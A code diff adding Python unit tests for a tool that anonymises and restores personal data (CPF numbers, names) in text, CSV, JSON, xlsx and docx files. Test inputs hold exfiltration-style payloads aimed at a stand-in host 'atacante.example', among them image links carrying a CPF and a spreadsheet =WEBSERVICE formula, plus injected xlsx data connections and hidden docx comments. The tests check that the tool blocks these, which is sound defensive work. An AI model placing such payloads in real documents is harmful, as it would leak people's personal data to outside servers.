@@ -285,7 +285,7 @@ class Arquivos(unittest.TestCase):
         self.assertIn("Cliente Ana Lima.", out)
         self.assertIn("![foto](https://x.com/a.png?cpf=[CPF_1])", out)
         self.assertIn("[perfil](https://x.com/u/[PESSOA_1])", out)
-        self.assertIn("[ver Ana Lima](/pasta/[CPF_1].md)", out)
+        self.assertIn("[ver [PESSOA_1]](/pasta/[CPF_1].md)", out)   # colado em "](/...": não troca
         self.assertIn("https://x.com/?c=[CPF_1] e www.x.com/[CPF_1] e mailto:[PESSOA_1]@x.com", out)
         self.assertIn("<https://x.com/[CPF_1]>", out)
         self.assertIn("[ref]: https://x.com/[CPF_1]", out)
@@ -332,6 +332,149 @@ class Arquivos(unittest.TestCase):
             verificacao.verificar([caminho], {("TELEFONE", "11987654321"): "(11) 98765-4321"}, "x.md")
         self.assertEqual(cm.exception.codigo, "sobrou_dado")
         verificacao.verificar([caminho], {("TELEFONE", "11999990000"): "11999990000"}, "x.md")
+
+    def test_reverter_estrutura_html_e_referencias_do_markdown(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}, {"tipo": "PESSOA", "valor": "Ana Lima", "marcador": "[PESSOA_1]"}]
+        entrada = ('Oi [PESSOA_1]!\n<img src="//atacante.example/?cpf=[CPF_1]">\n'
+                   '<img\n   alt="x"\n   src="/a?d=[CPF_1]">\n'
+                   '<!-- guardar [CPF_1]\n em duas linhas -->\n'
+                   '![logo][ref]\n\n[ref]:\n   /img?cpf=[CPF_1]\n   "titulo"\n'
+                   '[texto](\n  https://x.example/[CPF_1]\n)\n'
+                   'atacante.example/x?cpf=[CPF_1] e a/b/[CPF_1] e id=[CPF_1] e c:[CPF_1] e [CPF_1]#frag\n'
+                   'CPF [CPF_1], contato [PESSOA_1].')
+        esperado_fim = "CPF 52998224725, contato Ana Lima."
+        for nome in ("r.md", "r.txt"):
+            saida = os.path.join(self.tmp, "v-" + nome)
+            r = motor.tratar({"op": "reverter", "entrada": self.arquivo(nome, entrada), "saida": saida, "tabela": tabela})
+            self.assertTrue(r["ok"], r)
+            with open(saida, encoding="utf-8") as f:
+                out = f.read()
+            self.assertTrue(out.startswith("Oi Ana Lima!"), out)
+            self.assertTrue(out.endswith(esperado_fim), out)
+            self.assertEqual(out.count("52998224725"), 1, out)   # só a do fim
+        t = motor.tratar({"op": "reverter_texto", "texto": entrada, "tabela": tabela})
+        self.assertEqual(t["texto"].count("52998224725"), 1)
+        csv_ = self.arquivo("c.csv", 'a,b\n"<img src=""//x.example/?c=[CPF_1]"">",[CPF_1]\nx.example/?c=[CPF_1],[PESSOA_1]\n')
+        saida = os.path.join(self.tmp, "vc.csv")
+        motor.tratar({"op": "reverter", "entrada": csv_, "saida": saida, "tabela": tabela})
+        with open(saida, encoding="utf-8") as f:
+            out = f.read()
+        self.assertEqual(out.count("52998224725"), 1, out)
+        self.assertIn("Ana Lima", out)
+        js = self.arquivo("j.json", json.dumps({"a": "https://x/?c=[CPF_1]", "b": "x.example/?c=[CPF_1]", "c": "[CPF_1]", "d": '<a href="/p?c=[CPF_1]">'}))
+        saida = os.path.join(self.tmp, "vj.json")
+        motor.tratar({"op": "reverter", "entrada": js, "saida": saida, "tabela": tabela})
+        with open(saida, encoding="utf-8") as f:
+            out = json.load(f)
+        self.assertEqual(out["c"], "52998224725")
+        self.assertEqual([out[k].count("52998224725") for k in "abd"], [0, 0, 0])
+
+    def test_reverter_csv_nao_vira_formula(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        csv_ = self.arquivo("f.csv", 'a,b,c,d\n=1+1,-5,"=WEBSERVICE(""https://atacante.example/?d=""&""[CPF_1]"")",CPF [CPF_1]\n+cmd,@x,ok,\n')
+        saida = os.path.join(self.tmp, "vf.csv")
+        r = motor.tratar({"op": "reverter", "entrada": csv_, "saida": saida, "tabela": tabela})
+        self.assertTrue(r["ok"], r)
+        import csv as _csv
+        with open(saida, encoding="utf-8", newline="") as f:
+            linhas = list(_csv.reader(f))
+        self.assertEqual(linhas[1][:2], ["'=1+1", "'-5"])
+        self.assertTrue(linhas[1][2].startswith("'=WEBSERVICE"))
+        self.assertIn("[CPF_1]", linhas[1][2])      # dentro de URL/pedaço com = & : não troca
+        self.assertEqual(linhas[1][3], "CPF 52998224725")
+        self.assertEqual(linhas[2][:3], ["'+cmd", "'@x", "ok"])
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_reverter_sai_sem_formulas_e_sem_conexoes(self):
+        import openpyxl
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws["A1"] = "[CPF_1]"
+        ws["B1"] = '=WEBSERVICE("https://atacante.example/?d="&A1)'
+        ws["C1"] = "=1+2"
+        ws["D1"] = "=A1&\"x\""
+        origem = os.path.join(self.tmp, "f.xlsx")
+        wb.save(origem)
+        injetado = os.path.join(self.tmp, "g.xlsx")
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "[Content_Types].xml":
+                    dados = dados.replace(b"</Types>", b'<Override PartName="/xl/connections.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml"/></Types>')
+                if info.filename == "xl/_rels/workbook.xml.rels":
+                    dados = dados.replace(b"</Relationships>", b'<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/connections" Target="connections.xml"/></Relationships>')
+                zout.writestr(info, dados)
+            zout.writestr("xl/connections.xml", '<connections xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>')
+        saida = os.path.join(self.tmp, "v.xlsx")
+        r = motor.tratar({"op": "reverter", "entrada": injetado, "saida": saida, "tabela": [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]})
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(saida) as z:
+            self.assertNotIn("xl/connections.xml", z.namelist())
+            for n in z.namelist():
+                if n.startswith("xl/worksheets/"):
+                    self.assertNotIn(b"<f>", z.read(n))
+                    self.assertNotIn(b"<f ", z.read(n))
+        novo = openpyxl.load_workbook(saida).active
+        self.assertEqual(novo["A1"].value, "52998224725")
+        self.assertEqual(novo["B1"].data_type, "s")
+        self.assertIn("WEBSERVICE", novo["B1"].value)
+        self.assertEqual(novo["C1"].data_type, "s")
+
+    @unittest.skipUnless(tem("docx") and tem("lxml"), "python-docx não está instalado neste Python")
+    def test_docx_comentario_xml_e_instrucao_de_processamento_saem(self):
+        import docx
+        d = docx.Document()
+        d.add_paragraph("Texto qualquer.")
+        origem = os.path.join(self.tmp, "c.docx")
+        d.save(origem)
+        c = cpf_ficticio("246813579")
+        injetado = os.path.join(self.tmp, "ci.docx")
+        with zipfile.ZipFile(origem) as zin, zipfile.ZipFile(injetado, "w") as zout:
+            for info in zin.infolist():
+                dados = zin.read(info.filename)
+                if info.filename == "word/document.xml":
+                    dados = dados.replace(b"<w:body>", ("<w:body><!-- CPF %s --><?alvo dado %s?>" % (fmt_cpf(c), c)).encode())
+                zout.writestr(info, dados)
+        # a verificação, sozinha, enxerga o comentário (texto bruto)
+        with self.assertRaises(motor.ErroMotor) as cm:
+            verificacao.verificar([injetado], {("CPF", c): fmt_cpf(c)}, "c.docx")
+        self.assertEqual(cm.exception.codigo, "sobrou_dado")
+        # e o motor tira comentário e instrução antes
+        r = self.pedir(injetado, tabela=[{"tipo": "CPF", "valor": fmt_cpf(c), "marcador": "[CPF_1]"}])
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(os.path.join(self.saida, "doc-1.anon.docx")) as z:
+            xml = z.read("word/document.xml")
+        self.assertNotIn(b"<!--", xml)
+        self.assertNotIn(b"<?alvo", xml)
+        self.assertNotIn(c.encode(), xml)
+
+    @unittest.skipUnless(tem("openpyxl"), "openpyxl não está instalado neste Python")
+    def test_xlsx_literal_de_formula_na_coluna_cpf_e_datas_nativas(self):
+        import datetime
+        import openpyxl
+        cpf = cpf_ficticio("012345678")
+        self.assertTrue(cpf.startswith("0"))
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        ws.append(["Nome", "CPF", "Nascimento"])
+        ws.append(["x", "=%d" % int(cpf), datetime.datetime(1990, 7, 22)])
+        ws.append(["y", int(cpf), datetime.date(2001, 1, 5)])
+        origem = os.path.join(self.tmp, "d.xlsx")
+        wb.save(origem)
+        r = self.pedir(origem, datas=True)
+        self.assertTrue(r["ok"], r)
+        novo = openpyxl.load_workbook(os.path.join(self.saida, "doc-1.anon.xlsx")).active
+        self.assertEqual(novo["B2"].value, "[CPF_1]")
+        self.assertEqual(novo["B3"].value, "[CPF_1]")
+        self.assertEqual((novo["C2"].value, novo["C3"].value), ("[DATA_1]", "[DATA_2]"))
+        self.assertTrue(any("fórmula" in a for a in r["avisos"]))
+        csv_ = self.ler("doc-1.anon.csv")
+        for proibido in ("1990", "22/07", "2001-01-05", "1234567890", "0" + str(int(cpf))):
+            self.assertNotIn(proibido, csv_)
+        # com datas desligado a data fica como estava
+        r = self.pedir(origem)
+        self.assertTrue(r["ok"], r)
+        self.assertIn("1990-07-22", self.ler("doc-1.anon.csv"))
 
     def test_pptx_reverter(self):
         slide = ('<?xml version="1.0"?><p:sld xmlns:a="a" xmlns:p="p"><a:p><a:r><a:t>Cliente [PESS</a:t></a:r>'
